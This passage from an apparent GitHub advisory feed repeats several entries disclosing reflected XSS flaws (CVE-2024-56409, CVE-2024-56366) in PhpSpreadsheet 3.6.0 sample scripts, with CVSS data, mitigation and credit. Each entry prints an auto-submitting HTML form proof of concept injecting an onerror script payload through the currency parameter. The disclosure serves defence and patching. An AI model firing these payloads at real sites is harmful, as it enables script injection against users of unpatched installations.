    &lt;/form&gt;
    &lt;script&gt;
      history.pushState('', '', '/');
      document.forms[0].submit();
    &lt;/script&gt;
  &lt;/body&gt;
&lt;/html&gt;
</code></pre>
<p>After sending the script provided in Listing 5, the XSS vulnerability is exploited. Figure 10 shows the execution of arbitrary JavaScript code during the submission of a POST form. </p>
<img src="https://github.com/user-attachments/assets/2be8c94b-03ac-40d9-aa7a-9d326eb79335" alt="fig10" width="428">

<p><em>Figure 10. Executing arbitrary JavaScript code</em></p>
<h1 id="credit">Credit</h1>
<p>This vulnerability was discovered by <strong>Aleksey Solovev (Positive Technologies)</strong></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-j2xg-cjcx-4677">https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-j2xg-cjcx-4677</a></li>
<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/commit/700a80346be269af668914172bc6f4521982d0b4">https://github.com/PHPOffice/PhpSpreadsheet/commit/700a80346be269af668914172bc6f4521982d0b4</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-56409">https://nvd.nist.gov/vuln/detail/CVE-2024-56409</a></li>
<li><a href="https://github.com/advisories/GHSA-j2xg-cjcx-4677">https://github.com/advisories/GHSA-j2xg-cjcx-4677</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-j2xg-cjcx-4677</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-01-03T17:06:51.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[phpoffice/phpspreadsheet] PhpSpreadsheet allows unauthorized Reflected XSS in Currency.php file]]></title>
        <id>https://github.com/advisories/GHSA-j2xg-cjcx-4677</id>
        <link href="https://github.com/advisories/GHSA-j2xg-cjcx-4677"/>
        <updated>2025-01-03T19:17:19.000Z</updated>
        <content type="html"><![CDATA[<h1 id="unauthorized-reflected-xss-in-currencyphp-file">Unauthorized Reflected XSS in <code>Currency.php</code> file</h1>
<p><strong>Product</strong>: Phpspreadsheet
<strong>Version</strong>: version 3.6.0
<strong>CWE-ID</strong>: CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')
<strong>CVSS vector v.3.1</strong>: 8.2 (AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:H/A:N)
<strong>CVSS vector v.4.0</strong>: 8.3 (AV:N/AC:L/AT:N/PR:N/UI:A/VC:N/VI:H/VA:N/SC:L/SI:H/SA:L)
<strong>Description</strong>: using the <code>/vendor/phpoffice/phpspreadsheet/samples/Wizards/NumberFormat/Currency.php</code> script, an attacker can perform XSS-type attack
<strong>Impact</strong>: executing arbitrary JavaScript code in the browser
<strong>Vulnerable component</strong>: the <code>/vendor/phpoffice/phpspreadsheet/samples/Wizards/NumberFormat/Currency.php</code> file
<strong>Exploitation conditions</strong>: an unauthorized user
<strong>Mitigation</strong>: sanitization of the <code>currency</code> variable
<strong>Researcher</strong>: Aleksey Solovev (Positive Technologies)</p>
<h1 id="research">Research</h1>
<p>The researcher discovered zero-day vulnerability Unauthorized Reflected Cross-Site Scripting (XSS) (in <code>Currency.php</code> file) in Phpspreadsheet.</p>
<p>There is no sanitization in the <code>/vendor/phpoffice/phpspreadsheet/samples/Wizards/NumberFormat/Currency.php</code> file, which leads to the possibility of a XSS attack.
Strings are formed using the <code>currency</code> parameter without sanitization, controlled by an attacker.</p>
<p><img alt="fig9" src="https://github.com/user-attachments/assets/dfac3fbf-de42-42af-8163-b76f0c54da6c"></p>
<p><em>Figure 9.  A fragment of the query in which a string and a parameter are formed without sanitization</em></p>
<p>An attacker can prepare a special HTML form that will be automatically sent to the vulnerable scenario.</p>
<p><em>Listing 5. HTML form that demonstrates the exploitation of the XSS vulnerability</em></p>
<pre><code>&lt;html&gt;
  &lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;
  &lt;body&gt;
    &lt;form action="https://192.***.***.***/vendor/phpoffice/phpspreadsheet/samples/Wizards/NumberFormat/Currency.php" method="POST"&gt;
      &lt;input type="hidden" name="number" value="1234&amp;#46;5678" /&gt;
      &lt;input type="hidden" name="currency" value="&amp;#36;&amp;apos;&amp;quot;&amp;lt;img&amp;#32;src&amp;#61;1&amp;#32;onerror&amp;#61;alert&amp;#40;&amp;#41;&amp;gt;" /&gt;
      &lt;input type="hidden" name="decimals" value="2" /&gt;
      &lt;input type="hidden" name="position" value="1" /&gt;
      &lt;input type="hidden" name="spacing" value="0" /&gt;
      &lt;input type="hidden" name="submit" value="Display&amp;#32;Mask" /&gt;
      &lt;input type="submit" value="Submit request" /&gt;
    &lt;/form&gt;
    &lt;script&gt;
      history.pushState('', '', '/');
      document.forms[0].submit();
    &lt;/script&gt;
  &lt;/body&gt;
&lt;/html&gt;
</code></pre>
<p>After sending the script provided in Listing 5, the XSS vulnerability is exploited. Figure 10 shows the execution of arbitrary JavaScript code during the submission of a POST form. </p>
<img src="https://github.com/user-attachments/assets/2be8c94b-03ac-40d9-aa7a-9d326eb79335" alt="fig10" width="428">

<p><em>Figure 10. Executing arbitrary JavaScript code</em></p>
<h1 id="credit">Credit</h1>
<p>This vulnerability was discovered by <strong>Aleksey Solovev (Positive Technologies)</strong></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-j2xg-cjcx-4677">https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-j2xg-cjcx-4677</a></li>
<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/commit/700a80346be269af668914172bc6f4521982d0b4">https://github.com/PHPOffice/PhpSpreadsheet/commit/700a80346be269af668914172bc6f4521982d0b4</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-56409">https://nvd.nist.gov/vuln/detail/CVE-2024-56409</a></li>
<li><a href="https://github.com/advisories/GHSA-j2xg-cjcx-4677">https://github.com/advisories/GHSA-j2xg-cjcx-4677</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-j2xg-cjcx-4677</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-01-03T17:06:51.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[phpoffice/phpspreadsheet] PhpSpreadsheet allows unauthorized Reflected XSS in Currency.php file]]></title>
        <id>https://github.com/advisories/GHSA-j2xg-cjcx-4677</id>
        <link href="https://github.com/advisories/GHSA-j2xg-cjcx-4677"/>
        <updated>2025-01-03T19:17:19.000Z</updated>
        <content type="html"><![CDATA[<h1 id="unauthorized-reflected-xss-in-currencyphp-file">Unauthorized Reflected XSS in <code>Currency.php</code> file</h1>
<p><strong>Product</strong>: Phpspreadsheet
<strong>Version</strong>: version 3.6.0
<strong>CWE-ID</strong>: CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')
<strong>CVSS vector v.3.1</strong>: 8.2 (AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:H/A:N)
<strong>CVSS vector v.4.0</strong>: 8.3 (AV:N/AC:L/AT:N/PR:N/UI:A/VC:N/VI:H/VA:N/SC:L/SI:H/SA:L)
<strong>Description</strong>: using the <code>/vendor/phpoffice/phpspreadsheet/samples/Wizards/NumberFormat/Currency.php</code> script, an attacker can perform XSS-type attack
<strong>Impact</strong>: executing arbitrary JavaScript code in the browser
<strong>Vulnerable component</strong>: the <code>/vendor/phpoffice/phpspreadsheet/samples/Wizards/NumberFormat/Currency.php</code> file
<strong>Exploitation conditions</strong>: an unauthorized user
<strong>Mitigation</strong>: sanitization of the <code>currency</code> variable
<strong>Researcher</strong>: Aleksey Solovev (Positive Technologies)</p>
<h1 id="research">Research</h1>
<p>The researcher discovered zero-day vulnerability Unauthorized Reflected Cross-Site Scripting (XSS) (in <code>Currency.php</code> file) in Phpspreadsheet.</p>
<p>There is no sanitization in the <code>/vendor/phpoffice/phpspreadsheet/samples/Wizards/NumberFormat/Currency.php</code> file, which leads to the possibility of a XSS attack.
Strings are formed using the <code>currency</code> parameter without sanitization, controlled by an attacker.</p>
<p><img alt="fig9" src="https://github.com/user-attachments/assets/dfac3fbf-de42-42af-8163-b76f0c54da6c"></p>
<p><em>Figure 9.  A fragment of the query in which a string and a parameter are formed without sanitization</em></p>
<p>An attacker can prepare a special HTML form that will be automatically sent to the vulnerable scenario.</p>
<p><em>Listing 5. HTML form that demonstrates the exploitation of the XSS vulnerability</em></p>
<pre><code>&lt;html&gt;
  &lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;
  &lt;body&gt;
    &lt;form action="https://192.***.***.***/vendor/phpoffice/phpspreadsheet/samples/Wizards/NumberFormat/Currency.php" method="POST"&gt;
      &lt;input type="hidden" name="number" value="1234&amp;#46;5678" /&gt;
      &lt;input type="hidden" name="currency" value="&amp;#36;&amp;apos;&amp;quot;&amp;lt;img&amp;#32;src&amp;#61;1&amp;#32;onerror&amp;#61;alert&amp;#40;&amp;#41;&amp;gt;" /&gt;
      &lt;input type="hidden" name="decimals" value="2" /&gt;
      &lt;input type="hidden" name="position" value="1" /&gt;
      &lt;input type="hidden" name="spacing" value="0" /&gt;
      &lt;input type="hidden" name="submit" value="Display&amp;#32;Mask" /&gt;
      &lt;input type="submit" value="Submit request" /&gt;
    &lt;/form&gt;
    &lt;script&gt;
      history.pushState('', '', '/');
      document.forms[0].submit();
    &lt;/script&gt;
  &lt;/body&gt;
&lt;/html&gt;
</code></pre>
<p>After sending the script provided in Listing 5, the XSS vulnerability is exploited. Figure 10 shows the execution of arbitrary JavaScript code during the submission of a POST form. </p>
<img src="https://github.com/user-attachments/assets/2be8c94b-03ac-40d9-aa7a-9d326eb79335" alt="fig10" width="428">

<p><em>Figure 10. Executing arbitrary JavaScript code</em></p>
<h1 id="credit">Credit</h1>
<p>This vulnerability was discovered by <strong>Aleksey Solovev (Positive Technologies)</strong></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-j2xg-cjcx-4677">https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-j2xg-cjcx-4677</a></li>
<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/commit/700a80346be269af668914172bc6f4521982d0b4">https://github.com/PHPOffice/PhpSpreadsheet/commit/700a80346be269af668914172bc6f4521982d0b4</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-56409">https://nvd.nist.gov/vuln/detail/CVE-2024-56409</a></li>
<li><a href="https://github.com/advisories/GHSA-j2xg-cjcx-4677">https://github.com/advisories/GHSA-j2xg-cjcx-4677</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-j2xg-cjcx-4677</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-01-03T17:06:51.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[phpoffice/phpspreadsheet] PhpSpreadsheet allows unauthorized Reflected XSS in the Accounting.php file]]></title>
        <id>https://github.com/advisories/GHSA-c6fv-7vh8-2rhr</id>
        <link href="https://github.com/advisories/GHSA-c6fv-7vh8-2rhr"/>
        <updated>2025-01-03T19:17:02.000Z</updated>
        <content type="html"><![CDATA[<h1 id="unauthorized-reflected-xss-in-the-accountingphp-file">Unauthorized Reflected XSS in the <code>Accounting.php</code> file</h1>
<p><strong>Product</strong>: Phpspreadsheet
<strong>Version</strong>: version 3.6.0
<strong>CWE-ID</strong>: CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')
<strong>CVSS vector v.3.1</strong>: 8.2 (AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:H/A:N)
<strong>CVSS vector v.4.0</strong>: 8.3 (AV:N/AC:L/AT:N/PR:N/UI:A/VC:N/VI:H/VA:N/SC:L/SI:H/SA:L)
<strong>Description</strong>: using the <code>/vendor/phpoffice/phpspreadsheet/samples/Wizards/NumberFormat/Accounting.php</code> script, an attacker can perform a XSS-type attack
<strong>Impact</strong>: executing arbitrary JavaScript code in the browser
<strong>Vulnerable component</strong>: the <code>/vendor/phpoffice/phpspreadsheet/samples/Wizards/NumberFormat/Accounting.php</code> file
<strong>Exploitation conditions</strong>: an unauthorized user
<strong>Mitigation</strong>: sanitization of the currency variable
<strong>Researcher</strong>: Aleksey Solovev (Positive Technologies)</p>
<h1 id="research">Research</h1>
<p>The researcher discovered zero-day vulnerability Unauthorized Reflected Cross-Site Scripting (XSS) (in <code>Accounting.php</code> file) in Phpspreadsheet.</p>
<p>There is no sanitization in the <code>/vendor/phpoffice/phpspreadsheet/samples/Wizards/NumberFormat/Accounting.php</code> file, which leads to the possibility of a XSS attack.
Strings are formed using the currency parameter without sanitization, which is controlled by the attacker.</p>
<p><img alt="fig7" src="https://github.com/user-attachments/assets/da0ee52d-2306-4770-a61d-bce4ba553f4f"></p>
<p><em>Figure 7. A fragment of the query in which a string and a parameter are formed without sanitization</em></p>
<p>An attacker can prepare a special HTML form that will be automatically sent to the vulnerable scenario.</p>
<p><em>Listing 4. HTML form that demonstrates the exploitation of the XSS vulnerability</em></p>
<pre><code>&lt;html&gt;
  &lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;
  &lt;body&gt;
    &lt;form action="https://192.***.***.***/vendor/phpoffice/phpspreadsheet/samples/Wizards/NumberFormat/Accounting.php" method="POST"&gt;
      &lt;input type="hidden" name="number" value="1234&amp;#46;5678" /&gt;
      &lt;input type="hidden" name="currency" value="&amp;#36;&amp;lt;img&amp;#32;src&amp;#61;1&amp;#32;onerror&amp;#61;alert&amp;#40;&amp;#41;&amp;gt;" /&gt;
      &lt;input type="hidden" name="decimals" value="2" /&gt;
      &lt;input type="hidden" name="position" value="1" /&gt;
      &lt;input type="hidden" name="spacing" value="0" /&gt;
      &lt;input type="hidden" name="submit" value="Display&amp;#32;Mask" /&gt;
      &lt;input type="submit" value="Submit request" /&gt;
    &lt;/form&gt;
    &lt;script&gt;
      history.pushState('', '', '/');
      document.forms[0].submit();
    &lt;/script&gt;
  &lt;/body&gt;
&lt;/html&gt;
</code></pre>
<p>After sending the script provided in Listing 4, the XSS vulnerability is exploited. Figure 8 shows the execution of arbitrary JavaScript code during the submission of a POST form.</p>
<img src="https://github.com/user-attachments/assets/b009256e-61f7-4d72-8f6a-cc6e0efe2bb1" alt="fig8" width="460">

<p><em>Figure 8. Executing arbitrary JavaScript code</em></p>
<h1 id="credit">Credit</h1>
<p>This vulnerability was discovered by <strong>Aleksey Solovev (Positive Technologies)</strong></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-c6fv-7vh8-2rhr">https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-c6fv-7vh8-2rhr</a></li>
<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/commit/700a80346be269af668914172bc6f4521982d0b4">https://github.com/PHPOffice/PhpSpreadsheet/commit/700a80346be269af668914172bc6f4521982d0b4</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-56366">https://nvd.nist.gov/vuln/detail/CVE-2024-56366</a></li>
<li><a href="https://github.com/advisories/GHSA-c6fv-7vh8-2rhr">https://github.com/advisories/GHSA-c6fv-7vh8-2rhr</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-c6fv-7vh8-2rhr</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-01-03T17:06:23.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[phpoffice/phpspreadsheet] PhpSpreadsheet allows unauthorized Reflected XSS in the Accounting.php file]]></title>
        <id>https://github.com/advisories/GHSA-c6fv-7vh8-2rhr</id>
        <link href="https://github.com/advisories/GHSA-c6fv-7vh8-2rhr"/>
        <updated>2025-01-03T19:17:02.000Z</updated>
        <content type="html"><![CDATA[<h1 id="unauthorized-reflected-xss-in-the-accountingphp-file">Unauthorized Reflected XSS in the <code>Accounting.php</code> file</h1>
<p><strong>Product</strong>: Phpspreadsheet
<strong>Version</strong>: version 3.6.0
<strong>CWE-ID</strong>: CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')
<strong>CVSS vector v.3.1</strong>: 8.2 (AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:H/A:N)
<strong>CVSS vector v.4.0</strong>: 8.3 (AV:N/AC:L/AT:N/PR:N/UI:A/VC:N/VI:H/VA:N/SC:L/SI:H/SA:L)
<strong>Description</strong>: using the <code>/vendor/phpoffice/phpspreadsheet/samples/Wizards/NumberFormat/Accounting.php</code> script, an attacker can perform a XSS-type attack
<strong>Impact</strong>: executing arbitrary JavaScript code in the browser
<strong>Vulnerable component</strong>: the <code>/vendor/phpoffice/phpspreadsheet/samples/Wizards/NumberFormat/Accounting.php</code> file
<strong>Exploitation conditions</strong>: an unauthorized user
<strong>Mitigation</strong>: sanitization of the currency variable
<strong>Researcher</strong>: Aleksey Solovev (Positive Technologies)</p>
<h1 id="research">Research</h1>
<p>The researcher discovered zero-day vulnerability Unauthorized Reflected Cross-Site Scripting (XSS) (in <code>Accounting.php</code> file) in Phpspreadsheet.</p>
<p>There is no sanitization in the <code>/vendor/phpoffice/phpspreadsheet/samples/Wizards/NumberFormat/Accounting.php</code> file, which leads to the possibility of a XSS attack.
Strings are formed using the currency parameter without sanitization, which is controlled by the attacker.</p>
<p><img alt="fig7" src="https://github.com/user-attachments/assets/da0ee52d-2306-4770-a61d-bce4ba553f4f"></p>
<p><em>Figure 7. A fragment of the query in which a string and a parameter are formed without sanitization</em></p>
<p>An attacker can prepare a special HTML form that will be automatically sent to the vulnerable scenario.</p>
<p><em>Listing 4. HTML form that demonstrates the exploitation of the XSS vulnerability</em></p>
<pre><code>&lt;html&gt;
  &lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;
  &lt;body&gt;
    &lt;form action="https://192.***.***.***/vendor/phpoffice/phpspreadsheet/samples/Wizards/NumberFormat/Accounting.php" method="POST"&gt;
      &lt;input type="hidden" name="number" value="1234&amp;#46;5678" /&gt;
      &lt;input type="hidden" name="currency" value="&amp;#36;&amp;lt;img&amp;#32;src&amp;#61;1&amp;#32;onerror&amp;#61;alert&amp;#40;&amp;#41;&amp;gt;" /&gt;
      &lt;input type="hidden" name="decimals" value="2" /&gt;
      &lt;input type="hidden" name="position" value="1" /&gt;
      &lt;input type="hidden" name="spacing" value="0" /&gt;
      &lt;input type="hidden" name="submit" value="Display&amp;#32;Mask" /&gt;
      &lt;input type="submit" value="Submit request" /&gt;
    &lt;/form&gt;
    &lt;script&gt;
      history.pushState('', '', '/');
      document.forms[0].submit();
    &lt;/script&gt;
  &lt;/body&gt;
&lt;/html&gt;
</code></pre>
<p>After sending the script provided in Listing 4, the XSS vulnerability is exploited. Figure 8 shows the execution of arbitrary JavaScript code during the submission of a POST form.</p>
<img src="https://github.com/user-attachments/assets/b009256e-61f7-4d72-8f6a-cc6e0efe2bb1" alt="fig8" width="460">

<p><em>Figure 8. Executing arbitrary JavaScript code</em></p>
<h1 id="credit">Credit</h1>
<p>This vulnerability was discovered by <strong>Aleksey Solovev (Positive Technologies)</strong></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-c6fv-7vh8-2rhr">https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-c6fv-7vh8-2rhr</a></li>
<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/commit/700a80346be269af668914172bc6f4521982d0b4">https://github.com/PHPOffice/PhpSpreadsheet/commit/700a80346be269af668914172bc6f4521982d0b4</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-56366">https://nvd.nist.gov/vuln/detail/CVE-2024-56366</a></li>
<li><a href="https://github.com/advisories/GHSA-c6fv-7vh8-2rhr">https://github.com/advisories/GHSA-c6fv-7vh8-2rhr</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-c6fv-7vh8-2rhr</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-01-03T17:06:23.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[phpoffice/phpspreadsheet] PhpSpreadsheet allows unauthorized Reflected XSS in the Accounting.php file]]></title>
        <id>https://github.com/advisories/GHSA-c6fv-7vh8-2rhr</id>
        <link href="https://github.com/advisories/GHSA-c6fv-7vh8-2rhr"/>
        <updated>2025-01-03T19:17:02.000Z</updated>
        <content type="html"><![CDATA[<h1 id="unauthorized-reflected-xss-in-the-accountingphp-file">Unauthorized Reflected XSS in the <code>Accounting.php</code> file</h1>
<p><strong>Product</strong>: Phpspreadsheet
<strong>Version</strong>: version 3.6.0
<strong>CWE-ID</strong>: CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')
<strong>CVSS vector v.3.1</strong>: 8.2 (AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:H/A:N)
<strong>CVSS vector v.4.0</strong>: 8.3 (AV:N/AC:L/AT:N/PR:N/UI:A/VC:N/VI:H/VA:N/SC:L/SI:H/SA:L)
<strong>Description</strong>: using the <code>/vendor/phpoffice/phpspreadsheet/samples/Wizards/NumberFormat/Accounting.php</code> script, an attacker can perform a XSS-type attack
<strong>Impact</strong>: executing arbitrary JavaScript code in the browser
<strong>Vulnerable component</strong>: the <code>/vendor/phpoffice/phpspreadsheet/samples/Wizards/NumberFormat/Accounting.php</code> file
<strong>Exploitation conditions</strong>: an unauthorized user
<strong>Mitigation</strong>: sanitization of the currency variable
<strong>Researcher</strong>: Aleksey Solovev (Positive Technologies)</p>
<h1 id="research">Research</h1>
<p>The researcher discovered zero-day vulnerability Unauthorized Reflected Cross-Site Scripting (XSS) (in <code>Accounting.php</code> file) in Phpspreadsheet.</p>
<p>There is no sanitization in the <code>/vendor/phpoffice/phpspreadsheet/samples/Wizards/NumberFormat/Accounting.php</code> file, which leads to the possibility of a XSS attack.
Strings are formed using the currency parameter without sanitization, which is controlled by the attacker.</p>
<p><img alt="fig7" src="https://github.com/user-attachments/assets/da0ee52d-2306-4770-a61d-bce4ba553f4f"></p>
<p><em>Figure 7. A fragment of the query in which a string and a parameter are formed without sanitization</em></p>
<p>An attacker can prepare a special HTML form that will be automatically sent to the vulnerable scenario.</p>
<p><em>Listing 4. HTML form that demonstrates the exploitation of the XSS vulnerability</em></p>
<pre><code>&lt;html&gt;
  &lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;
  &lt;body&gt;
    &lt;form action="https://192.***.***.***/vendor/phpoffice/phpspreadsheet/samples/Wizards/NumberFormat/Accounting.php" method="POST"&gt;
      &lt;input type="hidden" name="number" value="1234&amp;#46;5678" /&gt;
      &lt;input type="hidden" name="currency" value="&amp;#36;&amp;lt;img&amp;#32;src&amp;#61;1&amp;#32;onerror&amp;#61;alert&amp;#40;&amp;#41;&amp;gt;" /&gt;
      &lt;input type="hidden" name="decimals" value="2" /&gt;
      &lt;input type="hidden" name="position" value="1" /&gt;
      &lt;input type="hidden" name="spacing" value="0" /&gt;
      &lt;input type="hidden" name="submit" value="Display&amp;#32;Mask" /&gt;
      &lt;input type="submit" value="Submit request" /&gt;
    &lt;/form&gt;
    &lt;script&gt;
      history.pushState('', '', '/');
      document.forms[0].submit();
    &lt;/script&gt;
  &lt;/body&gt;
&lt;/html&gt;
</code></pre>
<p>After sending the script provided in Listing 4, the XSS vulnerability is exploited. Figure 8 shows the execution of arbitrary JavaScript code during the submission of a POST form.</p>
<img src="https://github.com/user-attachments/assets/b009256e-61f7-4d72-8f6a-cc6e0efe2bb1" alt="fig8" width="460">

<p><em>Figure 8. Executing arbitrary JavaScript code</em></p>
<h1 id="credit">Credit</h1>
<p>This vulnerability was discovered by <strong>Aleksey Solovev (Positive Technologies)</strong></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-c6fv-7vh8-2rhr">https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-c6fv-7vh8-2rhr</a></li>
<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/commit/700a80346be269af668914172bc6f4521982d0b4">https://github.com/PHPOffice/PhpSpreadsheet/commit/700a80346be269af668914172bc6f4521982d0b4</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-56366">https://nvd.nist.gov/vuln/detail/CVE-2024-56366</a></li>
<li><a href="https://github.com/advisories/GHSA-c6fv-7vh8-2rhr">https://github.com/advisories/GHSA-c6fv-7vh8-2rhr</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-c6fv-7vh8-2rhr</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-01-03T17:06:23.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[phpoffice/phpspreadsheet] PhpSpreadsheet allows unauthorized Reflected XSS in the Accounting.php file]]></title>
        <id>https://github.com/advisories/GHSA-c6fv-7vh8-2rhr</id>
        <link href="https://github.com/advisories/GHSA-c6fv-7vh8-2rhr"/>
        <updated>2025-01-03T19:17:02.000Z</updated>
        <content type="html"><![CDATA[<h1 id="unauthorized-reflected-xss-in-the-accountingphp-file">Unauthorized Reflected XSS in the <code>Accounting.php</code> file</h1>
<p><strong>Product</strong>: Phpspreadsheet
<strong>Version</strong>: version 3.6.0
<strong>CWE-ID</strong>: CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')
<strong>CVSS vector v.3.1</strong>: 8.2 (AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:H/A:N)
<strong>CVSS vector v.4.0</strong>: 8.3 (AV:N/AC:L/AT:N/PR:N/UI:A/VC:N/VI:H/VA:N/SC:L/SI:H/SA:L)
<strong>Description</strong>: using the <code>/vendor/phpoffice/phpspreadsheet/samples/Wizards/NumberFormat/Accounting.php</code> script, an attacker can perform a XSS-type attack
<strong>Impact</strong>: executing arbitrary JavaScript code in the browser
<strong>Vulnerable component</strong>: the <code>/vendor/phpoffice/phpspreadsheet/samples/Wizards/NumberFormat/Accounting.php</code> file
<strong>Exploitation conditions</strong>: an unauthorized user
<strong>Mitigation</strong>: sanitization of the currency variable
<strong>Researcher</strong>: Aleksey Solovev (Positive Technologies)</p>
<h1 id="research">Research</h1>
<p>The researcher discovered zero-day vulnerability Unauthorized Reflected Cross-Site Scripting (XSS) (in <code>Accounting.php</code> file) in Phpspreadsheet.</p>
<p>There is no sanitization in the <code>/vendor/phpoffice/phpspreadsheet/samples/Wizards/NumberFormat/Accounting.php</code> file, which leads to the possibility of a XSS attack.
Strings are formed using the currency parameter without sanitization, which is controlled by the attacker.</p>
<p><img alt="fig7" src="https://github.com/user-attachments/assets/da0ee52d-2306-4770-a61d-bce4ba553f4f"></p>
<p><em>Figure 7. A fragment of the query in which a string and a parameter are formed without sanitization</em></p>
<p>An attacker can prepare a special HTML form that will be automatically sent to the vulnerable scenario.</p>
<p><em>Listing 4. HTML form that demonstrates the exploitation of the XSS vulnerability</em></p>
<pre><code>&lt;html&gt;
  &lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;
  &lt;body&gt;
    &lt;form action="https://192.***.***.***/vendor/phpoffice/phpspreadsheet/samples/Wizards/NumberFormat/Accounting.php" method="POST"&gt;
      &lt;input type="hidden" name="number" value="1234&amp;#46;5678" /&gt;
      &lt;input type="hidden" name="currency" value="&amp;#36;&amp;lt;img&amp;#32;src&amp;#61;1&amp;#32;onerror&amp;#61;alert&amp;#40;&amp;#41;&amp;gt;" /&gt;
      &lt;input type="hidden" name="decimals" value="2" /&gt;
      &lt;input type="hidden" name="position" value="1" /&gt;
      &lt;input type="hidden" name="spacing" value="0" /&gt;
      &lt;input type="hidden" name="submit" value="Display&amp;#32;Mask" /&gt;
      &lt;input type="submit" value="Submit request" /&gt;
    &lt;/form&gt;
    &lt;script&gt;
      history.pushState('', '', '/');
      document.forms[0].submit();
    &lt;/script&gt;
  &lt;/body&gt;
&lt;/html&gt;
</code></pre>
<p>After sending the script provided in Listing 4, the XSS vulnerability is exploited. Figure 8 shows the execution of arbitrary JavaScript code during the submission of a POST form.</p>
<img src="https://github.com/user-attachments/assets/b009256e-61f7-4d72-8f6a-cc6e0efe2bb1" alt="fig8" width="460">

<p><em>Figure 8. Executing arbitrary JavaScript code</em></p>
<h1 id="credit">Credit</h1>
<p>This vulnerability was discovered by <strong>Aleksey Solovev (Positive Technologies)</strong></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-c6fv-7vh8-2rhr">https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-c6fv-7vh8-2rhr</a></li>
<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/commit/700a80346be269af668914172bc6f4521982d0b4">https://github.com/PHPOffice/PhpSpreadsheet/commit/700a80346be269af668914172bc6f4521982d0b4</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-56366">https://nvd.nist.gov/vuln/detail/CVE-2024-56366</a></li>
<li><a href="https://github.com/advisories/GHSA-c6fv-7vh8-2rhr">https://github.com/advisories/GHSA-c6fv-7vh8-2rhr</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
